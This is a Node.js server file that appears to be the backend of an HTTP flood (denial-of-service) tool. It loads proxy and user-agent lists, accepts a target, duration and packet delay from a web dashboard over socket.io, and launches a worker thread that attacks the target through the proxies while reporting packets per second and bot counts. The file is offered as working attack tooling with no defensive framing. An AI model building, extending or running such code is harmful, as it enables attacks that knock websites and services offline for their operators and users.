import express from "express";
import { createServer } from "http";
import { dirname, join } from "path";
import { Server } from "socket.io";
import { fileURLToPath } from "url";
import { Worker } from "worker_threads";

import { loadProxies, loadUserAgents } from "./utils/fileLoader.js";
import { filterProxies } from "./utils/proxyUtils.js";

// Define the workers based on attack type
const attackWorkers = {
  http: "./workers/httpAttack.js",
};

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer, {
  cors: {
    origin: "http://localhost:5173",
    methods: ["GET", "POST"],
  },
});

const proxies = loadProxies(join(__dirname, "../data/proxies.txt"));
const userAgents = loadUserAgents(join(__dirname, "../data/uas.txt"));

console.log("Proxies loaded:", proxies.length);
console.log("User agents loaded:", userAgents.length);

io.on("connection", (socket) => {
  console.log("Client connected");

  socket.emit("stats", {
    pps: 0,
    bots: proxies.length,
    totalPackets: 0,
    log: "🍤 Connected to the server.",
  });

  socket.on("startAttack", (params) => {
    const { target, duration, packetDelay, attackMethod } = params;
    const filteredProxies = filterProxies(proxies, attackMethod);
    const attackWorkerFile = attackWorkers[attackMethod];

    if (!attackWorkerFile) {
      socket.emit("stats", {
        log: `❌ Unsupported attack type: ${attackMethod}`,
      });
      return;
    }

    socket.emit("stats", {
      log: `🍒 Using ${filteredProxies.length} filtered proxies to perform attack.`,
      bots: filteredProxies.length,
    });

    const worker = new Worker(join(__dirname, attackWorkerFile), {
      workerData: {
        target,
        proxies: filteredProxies,
        userAgents,
        duration,
        packetDelay,
      },
    });

    worker.on("message", (message) => socket.emit("stats", message));
    worker.on("error", (error) => {
      console.error(`Worker error: ${error.message}`);
      socket.emit("stats", { log: `❌ Worker error: ${error.message}` });
    });
    worker.on("exit", (code) => {
      console.log(`Worker exited with code ${code}`);
      socket.emit("attackEnd");
    });

    socket.worker = worker;
  });

  socket.on("stopAttack", () => {
    if (socket.worker) {
      socket.worker.terminate();
      socket.emit("attackEnd");
    }
  });

  socket.on("disconnect", () => {
    if (socket.worker) {
      socket.worker.terminate();
    }
    console.log("Client disconnected");
  });
});

const PORT = 3000;
httpServer.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
